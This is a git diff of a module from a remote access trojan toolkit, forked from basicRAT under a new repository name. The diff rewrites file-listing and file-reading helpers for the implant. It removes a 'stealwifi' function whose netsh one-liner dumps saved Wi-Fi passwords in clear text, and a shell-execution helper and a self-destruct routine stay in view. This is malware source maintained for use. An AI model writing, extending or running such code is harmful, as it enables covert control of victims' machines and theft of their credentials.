@@ -1,7 +1,6 @@
-
 #
-# basicRAT toolkit module
-# https://github.com/vesche/basicRAT
+# RAT toolkit module
+# https://github.com/harshivara/RAT
 #
 
 import datetime
@@ -12,12 +11,13 @@ import urllib
 import zipfile
 
 
-def cat(f, plat):
-    if os.path.isfile(f):
-        if plat == 'win':
-            return execute('type {}'.format(f))
-        else:
-            return execute('cat {}'.format(f))
+def cat(file_path):
+    if os.path.isfile(file_path):
+        try:
+            with open(file_path) as f:
+                return f.read(4000)
+        except IOError:
+            return 'Error: Permission denied.'
     else:
         return 'Error: File not found.'
 
@@ -29,34 +29,21 @@ def execute(command):
     return output.stdout.read() + output.stderr.read()
 
 
-def stealwifi(plat):
-    if plat == 'win':
-        steal = r"""for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear"""
-        return execute(steal)
-    elif plat == 'nix':
-        pass
-
-    elif plat == 'mac':
-        pass
-
-def ls(path, plat):
+def ls(path):
     if not path:
         path = '.'
-    
+
     if os.path.exists(path):
-        if plat == 'win':
-            return execute('dir {}'.format(path))
-        else:
-            return execute('ls {}'.format(path))
+        try:
+            return '\n'.join(os.listdir(path))
+        except OSError:
+            return 'Error: Permission denied.'
     else:
         return 'Error: Path not found.'
 
 
-def pwd(plat):
-    if plat == 'win':
-        return execute('cd')
-    else:
-        return execute('pwd')
+def pwd():
+    return os.getcwd()
 
 
 def selfdestruct(plat):
